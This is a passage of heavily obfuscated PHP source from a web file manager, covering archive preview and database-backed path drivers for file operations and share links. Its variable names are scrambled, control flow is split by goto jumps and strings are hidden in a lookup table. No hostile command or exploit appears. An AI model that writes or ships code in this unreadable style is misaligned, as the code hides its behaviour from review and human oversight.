(!@file_exists(self::iconvSystem($aĞ¬Ò¹šó))) { if (isset($E¨åÕçÉ™Ë)) { url_request($c·‡ÅÑ‡Ü¶, $EŞ˜ØçÁ‹ö[1093], $aĞ¬Ò¹šó); } else { $B—Ì…–‡  = self::localFilePath($c·‡ÅÑ‡Ü¶, $cŸÅÆ“¢åÉ); $aĞ¬Ò¹šó = $B—Ì…–‡  ? $B—Ì…–‡  : self::download($c·‡ÅÑ‡Ü¶, $aĞ¬Ò¹šó); } } goto AŠ­¡îÉñ‚; AŠ­¡îÉñ‚: $aĞ¬Ò¹šó = self::iconvSystem($aĞ¬Ò¹šó); if ($b©î­¬‡Õƒ >= 0) { $D†ª‘«åˆ = isset($D®°á÷¼…Õ[$EŞ˜ØçÁ‹ö[1094]]) ? $D®°á÷¼…Õ[$EŞ˜ØçÁ‹ö[1094]] : !1; $aôäëº£‹ = isset($D®°á÷¼…Õ[$EŞ˜ØçÁ‹ö[28]]) ? $D®°á÷¼…Õ[$EŞ˜ØçÁ‹ö[28]] : $EŞ˜ØçÁ‹ö[33]; KodArchive::filePreview($aĞ¬Ò¹šó, $b©î­¬‡Õƒ, $D†ª‘«åˆ, $aôäëº£‹); self::archiveExt(); die; } $E“ÙŸˆôÑ = KodArchive::listContent($aĞ¬Ò¹šó); goto bô†ïÜÊ¯å; D‰»»§µƒÙ: $EŞ˜ØçÁ‹ö =& $_SERVER[œº]; $c·‡ÅÑ‡Ü¶ = $D®°á÷¼…Õ[$EŞ˜ØçÁ‹ö[76]]; $b©î­¬‡Õƒ = isset($D®°á÷¼…Õ[$EŞ˜ØçÁ‹ö[1090]]) ? $D®°á÷¼…Õ[$EŞ˜ØçÁ‹ö[1090]] : -1; goto DÜí×ÜÌé; D’æäÔÌ§: $f·ˆùŞ¥¾ = json_encode($E“ÙŸˆôÑ[$EŞ˜ØçÁ‹ö[1088]]); self::setContent($B÷Ûƒ´ÉêÊ, $f·ˆùŞ¥¾); if (count($E“ÙŸˆôÑ[$EŞ˜ØçÁ‹ö[1088]]) >= $A²˜’…¥Ä) { show_json(sprintf(LNG($EŞ˜ØçÁ‹ö[1092]), count($E“ÙŸˆôÑ[$EŞ˜ØçÁ‹ö[1088]])), !1); } goto b©·ŠÙ»­; FÕ’‡ÌğË¼: } private static function fileExt($d³´‰ÑˆÄŸ) { $EÜšŒ¢± =& $_SERVER[œº]; $f…˜ËÎ‘ºØ = $d³´‰ÑˆÄŸ[$EÜšŒ¢±[168]]; if ($f…˜ËÎ‘ºØ == $EÜšŒ¢±[1095]) { $fÌšë«¶Ÿ† = $EÜšŒ¢±[1096]; if (substr($d³´‰ÑˆÄŸ[$EÜšŒ¢±[28]], -strlen($fÌšë«¶Ÿ†)) == $fÌšë«¶Ÿ†) { $f…˜ËÎ‘ºØ = $EÜšŒ¢±[1097]; } } self::archiveExt($f…˜ËÎ‘ºØ); return $f…˜ËÎ‘ºØ; } private static function zipFileList($aé ÉòÙ‹Ë, $c¨Å¨Ãê³¿ = false) { $CÑÁ™¹èÃ =& $_SERVER[œº]; $D¦ªªŒ‡ƒó = array(); foreach ($aé ÉòÙ‹Ë as $eÀÎò¶êÜÇ) { $F©©„ÕÙÕ§ = $eÀÎò¶êÜÇ[$CÑÁ™¹èÃ[76]]; if ($c¨Å¨Ãê³¿) { $F©©„ÕÙÕ§ = self::copy($eÀÎò¶êÜÇ[$CÑÁ™¹èÃ[76]], $c¨Å¨Ãê³¿, $CÑÁ™¹èÃ[783]); } else { $cĞˆ÷±óõö = self::init($eÀÎò¶êÜÇ[$CÑÁ™¹èÃ[76]]); if ($cĞˆ÷±óõö->getType() == $CÑÁ™¹èÃ[106]) { $F©©„ÕÙÕ§ = $cĞˆ÷±óõö->path; } } if ($F©©„ÕÙÕ§ && self::local()->exist($F©©„ÕÙÕ§)) { $D¦ªªŒ‡ƒó[$eÀÎò¶êÜÇ[$CÑÁ™¹èÃ[76]]] = $F©©„ÕÙÕ§; } } if (!empty($D¦ªªŒ‡ƒó)) { return array_values($D¦ªªŒ‡ƒó); } show_json(LNG($CÑÁ™¹èÃ[1061]), !1); } public static function tmpFileName($B÷¯óğ›ÜÔ) { $A’È²êìÑ =& $_SERVER[œº]; $B†Ô¥ŞÕÛí = array($B÷¯óğ›ÜÔ[$A’È²êìÑ[28]], $B÷¯óğ›ÜÔ[$A’È²êìÑ[76]], $B÷¯óğ›ÜÔ[$A’È²êìÑ[78]], $B÷¯óğ›ÜÔ[$A’È²êìÑ[487]]); return md5(implode($A’È²êìÑ[71], $B†Ô¥ŞÕÛí)); } private static function localFilePath($c’°­Ë¢ Ù, $A”Ôùˆ‘…ô) { goto C÷¡ÕÜæ’Å; C÷¡ÕÜæ’Å: $aæÒÄî½ÇÛ =& $_SERVER[œº]; if ($A”Ôùˆ‘…ô == $aæÒÄî½ÇÛ[1098] && strtoupper(substr(PHP_OS, 0, 3)) == $aæÒÄî½ÇÛ[1099]) { return !1; } $c®¾†…™… = KodIO::parse($c’°­Ë¢ Ù); goto AïƒàŞ‚˜Ì; AïƒàŞ‚˜Ì: if ($c®¾†…™…[$aæÒÄî½ÇÛ[29]] == KodIO::KOD_SOURCE) { $AÈ‡Û¯å = Model($aæÒÄî½ÇÛ[790])->fileInfoGet(KodIO::sourceID($c’°­Ë¢ Ù)); if (!$AÈ‡Û¯å[$aæÒÄî½ÇÛ[76]]) { show_json($aæÒÄî½ÇÛ[1100], !1); } $c’°­Ë¢ Ù = $AÈ‡Û¯å[$aæÒÄî½ÇÛ[76]]; } $C¾Ìò›Œ† = self::init($c’°­Ë¢ Ù); $F²Ë÷Òˆç = $C¾Ìò›Œ†->getType(); goto fà¬ŸğÅî; fà¬ŸğÅî: if ($F²Ë÷Òˆç == $aæÒÄî½ÇÛ[106] || $F²Ë÷Òˆç == $aæÒÄî½ÇÛ[1101]) { if (!$C¾Ìò›Œ†->exist($C¾Ìò›Œ†->path)) { show_json(LNG($aæÒÄî½ÇÛ[105]), !1); } return $C¾Ìò›Œ†->path; } return !1; goto AĞÉµª¦Ì’; AĞÉµª¦Ì’: } private static function archiveExt($bÅÙ§Ñº  = '') { $GLOBALS[$_SERVER[œº][1102]] = $bÅÙ§Ñº ; } } goto a‚î¹ÁÀŒ¸; A‹ŸòÕ¶ƒ×: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($aÈğğ³îÉÏ) { $this->pathParse = $aÈğğ³îÉÏ; $this->model = Model($_SERVER[œº][1206]); } public function getPath($eÕë³‘ãìİ) { return trim($eÕë³‘ãìİ, $_SERVER[œº][8]); } public function pathFather($aÔàÑéêÜ®) { $E¹·Ôã—Ÿ = $this->parse($aÔàÑéêÜ®); $E¹·Ôã—Ÿ = $this->infoSimple($aÔàÑéêÜ®); return $E¹·Ôã—Ÿ ? $E¹·Ôã—Ÿ[$_SERVER[œº][478]] : !1; } public function pathThis($aÕô›‹ïªù) { $D‹¯°×’Æù = $this->infoSimple($aÕô›‹ïªù); return $D‹¯°×’Æù ? $D‹¯°×’Æù[$_SERVER[œº][28]] : !1; } public function getPathOuter($EèÓ‹©ì™‡) { if (!$EèÓ‹©ì™‡) { return $EèÓ‹©ì™‡; } $d¿·ÌƒÕÎ = $this->parse($EèÓ‹©ì™‡); return KodIO::make($d¿·ÌƒÕÎ[$_SERVER[œº][393]]); } public function copyFolderFromIO($B¡áçêĞ‡–, $dáÃ÷º¦å‘, $a›¨ØéË·¦, $eãø Œ¨ƒ, $E”ìàÃ¯ØÖ) { $B›™È©İ‰‡ = $this->model->copyFolderFromIO($B¡áçêĞ‡–, $dáÃ÷º¦å‘, $a›¨ØéË·¦, $eãø Œ¨ƒ, $E”ìàÃ¯ØÖ); return KodIO::make($B›™È©İ‰‡); } public function isParentOf($fÙÖŠ—çøÓ, $Dáˆ¨‘í˜ê) { return $this->model->isParentOf($fÙÖŠ—çøÓ, $Dáˆ¨‘í˜ê); } public function mkfile($F›õ…„ÊÜ, $BàáŒóãÒ = '', $E¼Â­ĞŒùë = REPEAT_RENAME) { $c¿³îºÚë¿ =& $_SERVER[œº]; $a„Ñ‚ÜÄò = $this->parse($F›õ…„ÊÜ); $F›õ…„ÊÜ = $a„Ñ‚ÜÄò[$c¿³îºÚë¿[393]]; for ($Bºİ©†Ò÷ = 0; $Bºİ©†Ò÷ < count($a„Ñ‚ÜÄò[$c¿³îºÚë¿[1207]]); $Bºİ©†Ò÷++) { $Bô­øÒ†ë = $a„Ñ‚ÜÄò[$c¿³îºÚë¿[1207]][$Bºİ©†Ò÷]; if ($Bºİ©†Ò÷ == count($a„Ñ‚ÜÄò[$c¿³îºÚë¿[1207]]) - 1) { $F›õ…„ÊÜ = $this->model->mkfile($F›õ…„ÊÜ, $Bô­øÒ†ë, $BàáŒóãÒ, $E¼Â­ĞŒùë); break; } $F›õ…„ÊÜ = $this->model->mkdir($F›õ…„ÊÜ, $Bô­øÒ†ë, REPEAT_SKIP); } return $this->getPathOuter($F›õ…„ÊÜ); } public function mkdir($FœŒÔ§·†à, $e»™‚Æê”ƒ = REPEAT_SKIP) { $Bµ±ˆµÑ­ï =& $_SERVER[œº]; $Eğ”Å‹ƒ»Ö = $this->parse($FœŒÔ§·†à); $FœŒÔ§·†à = $Eğ”Å‹ƒ»Ö[$Bµ±ˆµÑ­ï[393]]; for ($d÷òÔ‡ôÑÆ = 0; $d÷òÔ‡ôÑÆ < count($Eğ”Å‹ƒ»Ö[$Bµ±ˆµÑ­ï[1207]]); $d÷òÔ‡ôÑÆ++) { $aÂ•ÓŸ½Â = $Eğ”Å‹ƒ»Ö[$Bµ±ˆµÑ­ï[1207]][$d÷òÔ‡ôÑÆ]; $FœŒÔ§·†à = $this->model->mkdir($FœŒÔ§·†à, $aÂ•ÓŸ½Â, $e»™‚Æê”ƒ); } return $this->getPathOuter($FœŒÔ§·†à); } public function copyFile($aÃË¬¯“æà, $AæÙ‰¨†», $dÆ²àÅŸî = REPEAT_REPLACE) { $cá‰Àìˆè× =& $_SERVER[œº]; $d™ĞŠë©š = $this->parse($AæÙ‰¨†»); $a¥‘ˆóÓğÃ = $this->model->copy($aÃË¬¯“æà, $d™ĞŠë©š[$cá‰Àìˆè×[393]], $dÆ²àÅŸî, $d™ĞŠë©š[$cá‰Àìˆè×[76]]); return $a¥‘ˆóÓğÃ ? $this->getPathOuter($a¥‘ˆóÓğÃ) : !1; } public function moveFile($b¾ƒšâÓíÈ, $eôœ®¿ï·», $EºœÈÁë• = REPEAT_REPLACE) { $d‚¥ªØÕ„« =& $_SERVER[œº]; $aãÎÔÅ«‡ = $this->parse($eôœ®¿ï·»); $e³¦Á‚Å‘ = $this->model->move($b¾ƒšâÓíÈ, $aãÎÔÅ«‡[$d‚¥ªØÕ„«[393]], $EºœÈÁë•, $aãÎÔÅ«‡[$d‚¥ªØÕ„«[76]]); return $e³¦Á‚Å‘ ? $this->getPathOuter($e³¦Á‚Å‘) : !1; } public function copy($fãÇÎ„Ø³È, $B‰Ì•¬³µ, $F‰ªªˆ÷¸ˆ = REPEAT_REPLACE) { $a‹¾¥æÂ­è = $this->parse($B‰Ì•¬³µ); $Eã¥İ…õ£Ø = $this->model->copy($fãÇÎ„Ø³È, $a‹¾¥æÂ­è[$_SERVER[œº][393]], $F‰ªªˆ÷¸ˆ); return $Eã¥İ…õ£Ø ? $this->getPathOuter($Eã¥İ…õ£Ø) : !1; } public function moveSameAllow() { } public function move($dä‹Ú†öÌ, $Eôã„š­š, $Fæ¡›¯‘ = REPEAT_REPLACE) { $D˜Ïß‘±½î = $this->parse($Eôã„š­š); $A…¢Ò‘ÙÕº = $this->model->move($dä‹Ú†öÌ, $D˜Ïß‘±½î[$_SERVER[œº][393]], $Fæ¡›¯‘); return $A…¢Ò‘ÙÕº ? $this->getPathOuter($A…¢Ò‘ÙÕº) : !1; } public function remove($D¤Œ¦ßÕ·, $CÒÖÙÁ£·­ = true) { return $this->model->remove($D¤Œ¦ßÕ·, $CÒÖÙÁ£·­); } public function rename($CÜá‹ğí‚â, $eâ†È„ºİ†) { $B’é„ºÂïå = $this->model->rename($CÜá‹ğí‚â, $eâ†È„ºİ†); return $B’é„ºÂïå ? $this->getPathOuter($CÜá‹ğí‚â) : $B’é„ºÂïå; } public function size($aÇª…òÓŠƒ) { $EÖˆ„çÈ—± = $this->infoSimple($aÇª…òÓŠƒ); return $EÖˆ„çÈ—± ? $EÖˆ„çÈ—±[$_SERVER[œº][78]] : 0; } public function infoSimple($B†éµŸ›Ë») { return $this->model->sourceInfo($B†éµŸ›Ë»); } public function info($b—Ú§õÀìë) { return $this->infoParse($b—Ú§õÀìë); } public function infoAuth($A¶ÍÔİº) { return $this->infoParse($A¶ÍÔİº, !1, !0); } public function infoWithChildren($A–„¯¦îŠ) { return $this->infoParse($A–„¯¦îŠ, !0); } protected function infoParse($CöŠÊñ»á¨, $fŸâØìÁ‘¶ = false, $Còö‹ëÃ®Å = false) { if (!$fŸâØìÁ‘¶) { return $this->model->pathInfo($CöŠÊñ»á¨, $Còö‹ëÃ®Å); } return $this->model->pathInfoMore($CöŠÊñ»á¨); } public function infoFull($C…è‹»Š±¡) { $D†ª …ÊÕ =& $_SERVER[œº]; $aå¨˜¶ŒÛ = explode($D†ª …ÊÕ[8], $C…è‹»Š±¡); $fÉºººÜğ± = implode($D†ª …ÊÕ[8], array_splice($aå¨˜¶ŒÛ, 1)); return $this->model->pathInfoByPath($aå¨˜¶ŒÛ[0], $fÉºººÜğ±); } public function hashSimple($cê¶òå¢é) { $e†¾éâ =& $_SERVER[œº]; $D¡ë…¯Å ’ = $this->infoWithChildren($cê¶òå¢é); return $D¡ë…¯Å ’[$e†¾éâ[164]][$e†¾éâ[171]]; } public function hashMd5($CÌğĞøéâ) { $a¸Öğµ°ìÒ =& $_SERVER[œº]; $Fšƒ˜Ú†“á = $this->infoWithChildren($CÌğĞøéâ); return $Fšƒ˜Ú†“á[$a¸Öğµ°ìÒ[164]][$a¸Öğµ°ìÒ[170]]; } public function exist($b…‚£Œ Ğ) { $cÅ÷ê‰Š£© =& $_SERVER[œº]; $A®ÂÒœ˜áÊ = $this->parse($b…‚£Œ Ğ); if (!$A®ÂÒœ˜áÊ[$cÅ÷ê‰Š£©[76]]) { return $this->isFile($b…‚£Œ Ğ) || $this->isFolder($b…‚£Œ Ğ); } $aãõ¯‘•Çë = array($cÅ÷ê‰Š£©[394] => $A®ÂÒœ˜áÊ[$cÅ÷ê‰Š£©[393]], $cÅ÷ê‰Š£©[28] => $A®ÂÒœ˜áÊ[$cÅ÷ê‰Š£©[76]]); $DÎ¡»ÕÜé© = $this->model->where($aãõ¯‘•Çë)->find(); return $DÎ¡»ÕÜé© ? !0 : !1; } public function isFile($aâ¾ë©ñÉ¤) { $F›ö»·Ëß =& $_SERVER[œº]; $A¢çìÑÆíÅ = $this->infoSimple($aâ¾ë©ñÉ¤); return $A¢çìÑÆíÅ && $A¢çìÑÆíÅ[$F›ö»·Ëß[403]] == $F›ö»·Ëß[87] ? !1 : !0; } public function isFolder($D÷¼Ó¹ƒ‚) { $bŸ‰é®‚ùğ =& $_SERVER[œº]; $dç¹¬êèî = $this->infoSimple($D÷¼Ó¹ƒ‚); return $dç¹¬êèî && $dç¹¬êèî[$bŸ‰é®‚ùğ[403]] == $bŸ‰é®‚ùğ[87] ? !0 : !1; } public function listPath($dœ Ÿäæ…„, $c¬‡¼¨¾Ö = false) { $b™¢•ëİ÷ò =& $_SERVER[œº]; if ($dœ Ÿäæ…„ == $b™¢•ëİ÷ò[33]) { return !1; } $cë¢È¥ê×ƒ = array($b™¢•ëİ÷ò[394] => $dœ Ÿäæ…„); if ($c¬‡¼¨¾Ö) { return $this->model->listSource($cë¢È¥ê×ƒ, -1); } return $this->model->listSource($cë¢È¥ê×ƒ); } public function has($d¨¨ìÓì˜, $bó—èª·‰Æ = false, $d¸œèœ®” = null) { $f™Š¸ò¹Ş =& $_SERVER[œº]; $D†Á‚ù…³ = $this->infoWithChildren($d¨¨ìÓì˜); if ($bó—èª·‰Æ) { return array($f™Š¸ò¹Ş[204] => $D†Á‚ù…³[$f™Š¸ò¹Ş[204]], $f™Š¸ò¹Ş[203] => $D†Á‚ù…³[$f™Š¸ò¹Ş[203]]); } return $d¸œèœ®” ? $D†Á‚ù…³[$f™Š¸ò¹Ş[204]] : $D†Á‚ù…³[$f™Š¸ò¹Ş[203]]; } public function listAll($A¿…¸•ƒÁ‰) { $FÏ©øùè£ê = IO::info($this->pathParse[$_SERVER[œº][76]]); if (!$FÏ©øùè£ê) { return array(); } return $this->model->listAll($A¿…¸•ƒÁ‰); } public function getContent($Eèêğµ½˜) { return $this->model->getContent($Eèêğµ½˜); } public function setContent($d­İ°°»½Ó, $F‡ß‰¼®Ì = '') { return $this->model->setContent($d­İ°°»½Ó, $F‡ß‰¼®Ì); } public function fileSubstr($BªÚ©Œ¯Æ‡, $F…‚Ã§ãÄ, $eˆŸØ¥º) { return $this->model->fileSubstr($BªÚ©Œ¯Æ‡, $F…‚Ã§ãÄ, $eˆŸØ¥º); } public function download($bÀÎè‘’õŒ, $FãšÒëŠ‘ = '') { $Dô¥“è²ñô = get_path_father($FãšÒëŠ‘); $eŸ„¯øµ½£ = get_path_this($FãšÒëŠ‘); $c®Ÿ¢—Àâ = $this->model->fileInfoGet($bÀÎè‘’õŒ); $b¹”¯ÒÅØ = IO::copy($c®Ÿ¢—Àâ[$_SERVER[œº][76]], $Dô¥“è²ñô, !1, $eŸ„¯øµ½£); return $b¹”¯ÒÅØ; } public function setModifyTime($bÙ×éšÓœç, $aŒÛİŠ™‡¯ = '') { $aÅÉËÒÓŒ =& $_SERVER[œº]; if (!$bÙ×éšÓœç) { return; } $this->model->where(array($aÅÉËÒÓŒ[410] => $bÙ×éšÓœç))->save(array($aÅÉËÒÓŒ[84] => $aŒÛİŠ™‡¯)); } public function upload($D´Œ´¸›‚, $C¯‹“Úªåø, $Fî“Ù­§•† = false, $a–™ˆÄ• = REPEAT_REPLACE) { $ağƒ†İİÁÔ =& $_SERVER[œº]; $cæÚËäßö = $this->parse($D´Œ´¸›‚); $aª‚£¦Æ™Š = $this->model->addFile($cæÚËäßö[$ağƒ†İİÁÔ[393]], $C¯‹“Úªåø, $cæÚËäßö[$ağƒ†İİÁÔ[76]], $Fî“Ù­§•†, $a–™ˆÄ•); return $this->getPathOuter($aª‚£¦Æ™Š); } public function uploadFileByID($AÑÅ…›ß®³, $B²ĞµåÙˆ, $EÂÀ²°…) { $Dó»öÙš‡Õ =& $_SERVER[œº]; $bŒÁ É¸„Ë = $this->parse($AÑÅ…›ß®³); $D…ªÒ¥Å—’ = $this->model->addFileByFileID($bŒÁ É¸„Ë[$Dó»öÙš‡Õ[393]], $B²ĞµåÙˆ, $bŒÁ É¸„Ë[$Dó»öÙš‡Õ[76]], $EÂÀ²°…); return $this->getPathOuter($D…ªÒ¥Å—’); } public function addFileByRemote($fˆÉâ‡íÅ², $aÃæãëæ²©, $Aäèœ²Š»ø = array(), $A–Ç¦Á²²‡ = '', $fêõ¯ãÈø) { $FĞåÍææ‡ =& $_SERVER[œº]; $f›±×Øéñ = $this->parse($fˆÉâ‡íÅ²); $A–Ç¦Á²²‡ = empty($A–Ç¦Á²²‡) ? $f›±×Øéñ[$FĞåÍææ‡[76]] : $A–Ç¦Á²²‡; $FÎ—êÃ’Õ¤ = $this->model->addFileByRemote($f›±×Øéñ[$FĞåÍææ‡[393]], $aÃæãëæ²©, $A–Ç¦Á²²‡, $Aäèœ²Š»ø, $fêõ¯ãÈø); return $this->getPathOuter($FÎ—êÃ’Õ¤); } public function uploadLink($CÌÎÆÃ‚®¦, $d¶÷öšïËæ = 0) { $e…à¥ï¨·’ =& $_SERVER[œº]; $bëå¼òè = $this->parse($CÌÎÆÃ‚®¦); $DÂé‹öªÀŞ = _get($GLOBALS[$e…à¥ï¨·’[7]], $e…à¥ï¨·’[1208]); $DÁƒ½ÁÇª = _get($GLOBALS[$e…à¥ï¨·’[7]], $e…à¥ï¨·’[1209]); $CÌÎÆÃ‚®¦ = Model($e…à¥ï¨·’[571])->createFileName($bëå¼òè[$e…à¥ï¨·’[76]], $DÂé‹öªÀŞ, $DÁƒ½ÁÇª); return IO::uploadLink($CÌÎÆÃ‚®¦, $d¶÷öšïËæ); } public function fileNameAuto($D—Ï»¾ê‹ò, $D†…Ÿ˜»”, $Fİ”ÁÊÂéÀ = REPEAT_REPLACE, $Fï¡ŞãÛ = false) { return $this->model->fileNameAuto($D—Ï»¾ê‹ò, $D†…Ÿ˜»”, $Fİ”ÁÊÂéÀ, $Fï¡ŞãÛ); } public function fileNameExist($aºïï¿õ½, $aƒôİ±”£ ) { return $this->model->fileNameExist($aºïï¿õ½, $aƒôİ±”£ ); } protected function _fileOut($FÅÇ·×âï¯, $A‘¶Á¨ùªÍ = false, $b¢¾˜ô¹ê½ = false, $D“àœô•‘Ö = '', $bäÃâØÃó = false) { goto DÔÕ›¯¡‚õ; DÔÕ›¯¡‚õ: $C™í‹ãæª =& $_SERVER[œº]; $Fˆ™§‡ãœŒ = $this->model->sourceInfo($FÅÇ·×âï¯); if ($Fˆ™§‡ãœŒ[$C™í‹ãæª[403]] == $C™í‹ãæª[87]) { header($C™í‹ãæª[1210]); die; } goto B•¿˜£Å¹÷; B•¿˜£Å¹÷: $FïÈ˜ßïâå = $this->model->fileInfoGet($FÅÇ·×âï¯); $D“àœô•‘Ö = $FïÈ˜ßïâå[$C™í‹ãæª[170]] ? $FïÈ˜ßïâå[$C™í‹ãæª[170]] : $D“àœô•‘Ö; $d†Áëõ¶ò­ = isset($GLOBALS[$C™í‹ãæª[1211]]) ? $GLOBALS[$C™í‹ãæª[1211]] : $Fˆ™§‡ãœŒ[$C™í‹ãæª[28]]; goto a½åéä²³ï; a½åéä²³ï: if ($bäÃâØÃó) { return IO::fileOutServer($FïÈ˜ßïâå[$C™í‹ãæª[76]], $A‘¶Á¨ùªÍ, $d†Áëõ¶ò­, $D“àœô•‘Ö); } IO::fileOut($FïÈ˜ßïâå[$C™í‹ãæª[76]], $A‘¶Á¨ùªÍ, $d†Áëõ¶ò­, $D“àœô•‘Ö); goto FòÁ„ˆèŞ; FòÁ„ˆèŞ: } public function fileOut($c‚³“©é, $F­œ±ËĞ¤° = false, $bËöóÑ™Éó = false, $EˆÛå‡Ï¶® = '') { $this->_fileOut($c‚³“©é, $F­œ±ËĞ¤°, $bËöóÑ™Éó, $EˆÛå‡Ï¶®); } public function fileOutServer($E©óÂÌŠ¼, $Aáƒ½Õ…»ö = false, $eçˆ± ˜—¡ = false, $EàÀ˜–™ù = '') { $this->_fileOut($E©óÂÌŠ¼, $Aáƒ½Õ…»ö, $eçˆ± ˜—¡, $EàÀ˜–™ù, !0); } protected function _fileOutImage($eïˆö›â¹ƒ, $fö¯Ã÷Ó¿ = 250) { goto F®²éºŠƒë; fø–§¡ç± : $GLOBALS[$F–‹“¦À±[1211]] = $e œš„ß[$F–‹“¦À±[28]]; $GLOBALS[$F–‹“¦À±[162]] = $e œš„ß; IO::fileOutImage($e œš„ß[$F–‹“¦À±[76]], $fö¯Ã÷Ó¿); goto Cİ¯¿ÄÏ¦â; F®²éºŠƒë: $F–‹“¦À± =& $_SERVER[œº]; $A£¬‘¡­¯Ï = $this->model->pathInfo($eïˆö›â¹ƒ); if ($A£¬‘¡­¯Ï[$F–‹“¦À±[403]] == $F–‹“¦À±[87]) { show_json($F–‹“¦À±[1212] . $eïˆö›â¹ƒ, !1); } goto aë¬¸ÆÍñ; aë¬¸ÆÍñ: $e œš„ß = $this->model->fileInfoGet($eïˆö›â¹ƒ); $e œš„ß[$F–‹“¦À±[28]] = $A£¬‘¡­¯Ï[$F–‹“¦À±[28]]; $e œš„ß[$F–‹“¦À±[163]] = $A£¬‘¡­¯Ï[$F–‹“¦À±[163]]; goto fø–§¡ç± ; Cİ¯¿ÄÏ¦â: } public function fileOutImage($Aô‚Öéø, $C«¶Ê§Ñ¼Á = 250) { $this->_fileOutImage($Aô‚Öéø, $C«¶Ê§Ñ¼Á); } public function fileOutImageServer($f¥ÛÀÏ¡Æ¶, $B‹ãµ®«ÊË = 250) { $this->_fileOutImage($f¥ÛÀÏ¡Æ¶, $B‹ãµ®«ÊË); } public function link($câŞ‚ù—Ğµ, $Dãì¬ ¢İë = '') { $aæê…‘„ñ§ = $this->model->fileInfoGet($câŞ‚ù—Ğµ); return IO::link($aæê…‘„ñ§[$_SERVER[œº][76]], $Dãì¬ ¢İë); } protected function parse($E‡´š†¦‚¹) { $dÀÆ¯‚§‰ñ =& $_SERVER[œº]; if (strstr($E‡´š†¦‚¹, $dÀÆ¯‚§‰ñ[8]) === !1) { return array($dÀÆ¯‚§‰ñ[412] => intval($E‡´š†¦‚¹), $dÀÆ¯‚§‰ñ[76] => $dÀÆ¯‚§‰ñ[33], $dÀÆ¯‚§‰ñ[1207] => array()); } $CÇíİ•¹ = explode($dÀÆ¯‚§‰ñ[8], trim($E‡´š†¦‚¹, $dÀÆ¯‚§‰ñ[8])); if (count($CÇíİ•¹) < 2) { show_tips($E‡´š†¦‚¹ . $dÀÆ¯‚§‰ñ[1213]); } return array($dÀÆ¯‚§‰ñ[412] => intval($CÇíİ•¹[0]), $dÀÆ¯‚§‰ñ[76] => $CÇíİ•¹[1], $dÀÆ¯‚§‰ñ[1207] => array_slice($CÇíİ•¹, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($dØÍêĞÂ†) { $this->pathParse = $dØÍêĞÂ†; $this->model = Model($_SERVER[œº][1206]); } public function getPathOuter($e×ãğ²…îÛ) { $F°¨‹„ã†Û =& $_SERVER[œº]; if (!$e×ãğ²…îÛ) { return $e×ãğ²…îÛ; } $E•ÀêØ‚ò¢ = $this->parse($e×ãğ²…îÛ); return trim(KodIO::makeShare($this->pathParse[$F°¨‹„ã†Û[393]], $E•ÀêØ‚ò¢[$F°¨‹„ã†Û[393]]), $F°¨‹„ã†Û[8]); } protected function infoParse($c’¯¦‡Šğ, $F™Ó†™ÜÉá = false, $Cé“¦‘àË = false) { $fÉø»¢İº =& $_SERVER[œº]; $b¬¯ùª†µİ = $this->pathParse[$fÉø»¢İº[393]]; $Cœ› Û°¬‡ = trim($this->pathParse[$fÉø»¢İº[1064]], $fÉø»¢İº[8]); return Action($fÉø»¢İº[1214])->sharePathInfo($b¬¯ùª†µİ, $Cœ› Û°¬‡); } public function infoFull($E‹ŠÜÕÒ) { $Cõ„Ñà£«ç =& $_SERVER[œº]; $C’œ½Ú¯¹­ = explode($Cõ„Ñà£«ç[8], trim($E‹ŠÜÕÒ, $Cõ„Ñà£«ç[8])); if (count($C’œ½Ú¯¹­) > 1) { $dÜ™Œ«ÆÔÀ = implode($Cõ„Ñà£«ç[8], array_splice($C’œ½Ú¯¹­, 1)); $A³¼¾÷¼˜ß = $this->model->pathInfoByPath($C’œ½Ú¯¹­[0], $dÜ™Œ«ÆÔÀ); if (!$A³¼¾÷¼˜ß) { return !1; } $this->pathParse[$Cõ„Ñà£«ç[1064]] = $A³¼¾÷¼˜ß[$Cõ„Ñà£«ç[395]]; } return $this->infoParse($E‹ŠÜÕÒ); } public function listAll($AÂ¨•İ©å›) { goto D‰šä«˜‹; D‰šä«˜‹: $cÍõ§ŠÒÅ– =& $_SERVER[œº]; $D°ëÑæõ‚ = IO::info($this->pathParse[$cÍõ§ŠÒÅ–[76]]); if (!$D°ëÑæõ‚) { return array(); } goto fãìŠøì’·; fãìŠøì’·: $fÔÛíÆ¯° = $this->model->listAll($AÂ¨•İ©å›); $eì©­‡ì± = Model($cÍõ§ŠÒÅ–[563])->getInfo($D°ëÑæõ‚[$cÍõ§ŠÒÅ–[468]]); $CÜäÚ¬œŠº = Action($cÍõ§ŠÒÅ–[1214]); goto AÏ‹ªŸ§¶‰; AÏ‹ªŸ§¶‰: foreach ($fÔÛíÆ¯° as &$B˜¸Á›ğ®é) { check_abort(); $B˜¸Á›ğ®é[$cÍõ§ŠÒÅ–[85]] = $CÜäÚ¬œŠº->_shareItemeParse($B˜¸Á›ğ®é[$cÍõ§ŠÒÅ–[85]], $eì©­‡ì±); } unset($B˜¸Á›ğ®é); return $fÔÛíÆ¯°; goto fó‹Ü¿¬·; fó‹Ü¿¬·: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($f‚±ìí‘å) { $this->pathParse = $f‚±ìí‘å; $this->model = Model($_SERVER[œº][1206]); } protected function infoParse($b»’¯ß²À, $aá¹ïá‹¡ = false, $bÉæÀÄÏ»µ = false) { $BùŸŒäë¶ =& $_SERVER[œº]; return Action($BùŸŒäë¶[1070])->sharePathInfo($this->pathParse[$BùŸŒäë¶[76]], !0); } public function listPath($dÜ¨£Ñ», $a«Ø×¨ç³ = false) { $F²Ä„Ÿ×àŸ =& $_SERVER[œº]; $A÷ñ×  = parent::listPath($dÜ¨£Ñ», $a«Ø×¨ç³); foreach ($A÷ñ×  as $FÎÍ¶³‰‚ë => $A¶×Ş¹î) { if (!in_array($FÎÍ¶³‰‚ë, array($F²Ä„Ÿ×àŸ[74], $F²Ä„Ÿ×àŸ[75]))) { continue; } foreach ($A¶×Ş¹î as $F¬í‚ùù‘ => $c¼ˆ“Œïßƒ) { $A÷ñ× [$FÎÍ¶³‰‚ë][$F¬í‚ùù‘] = Action($F²Ä„Ÿ×àŸ[1070])->shareItemInfo($c¼ˆ“Œïßƒ); } } return $A÷ñ× ; } public function listAll($e„Ñ¤„£ŠÅ) { goto bÑ—éĞòÂ¸; EÓ¾ˆ¤¬: $fÁÑ¯ç¹£ = $this->model->listAll($e„Ñ¤„£ŠÅ); foreach ($fÁÑ¯ç¹£ as &$F“ùßï‚Ñç) { 